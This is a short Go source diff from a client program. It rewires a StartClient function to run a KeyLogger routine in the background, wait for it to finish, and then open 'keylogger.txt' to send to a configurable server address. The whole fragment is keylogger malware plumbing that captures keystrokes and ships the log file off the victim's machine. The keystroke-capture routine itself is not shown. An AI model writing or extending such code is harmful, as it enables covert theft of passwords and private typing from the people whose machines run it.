@@ -11,8 +11,20 @@ func StartClient() {
 	// Replace "server_ip" with the IP address or hostname of the server.
 	serverAddress := "localhost:12345"
 
-	// Start logging for 1 Minute
-	KeyLogger()
+	// Create a channel to signal when the file has been sent
+	fileSent := make(chan struct{})
+
+	// Start the logger in the background
+	go func() {
+		// Create logs and save to a file
+		KeyLogger()
+
+		// Once the logs are created, signal that the file is ready to be sent
+		fileSent <- struct{}{}
+	}()
+
+	// Wait for the signal to send the file
+	<-fileSent
 
 	// Open the file you want to send
 	file, err := os.Open("keylogger.txt")
